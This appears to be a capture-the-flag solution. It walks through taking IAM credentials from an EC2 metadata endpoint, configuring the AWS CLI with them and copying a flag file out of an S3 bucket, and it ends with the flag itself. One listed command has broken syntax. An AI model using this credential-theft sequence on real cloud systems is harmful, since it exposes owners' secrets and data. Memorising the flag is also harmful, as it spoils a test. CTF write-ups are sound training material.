# Title



# Description



# Solve

1. Make a request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to find the IAM role that is associated with the EC2.
2. Make a request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM ROLE>` to determine the accesskeyid and secretaccesskey of the AWS IAM Role.
3. On a terminal with the AWS CLI installed, run `aws configure` and configure the Access Key, Secret Access Key, and the region. The region can be guessed either by the IP of the EC2/website (curl -O https://ip-ranges.amazonaws.com/ip-ranges.json), or they can guess. 
4. Determine what permissions the user has, either through a brute force, or by just checking some common ones. This use also has the ability to read S3 buckets.
5. Run `aws s3 ls`, which will show all S3 buckets the user has access to. 
6. Run ` aws s3 s3://magpie2025-secret/ ls` to see all the files in the bucket.
7. Run ` aws s3 cp s3://magpie2025-secret/flag.txt .` to download the flag. 

# Flag

magpie{14m_15_700_345y_70_m355_up}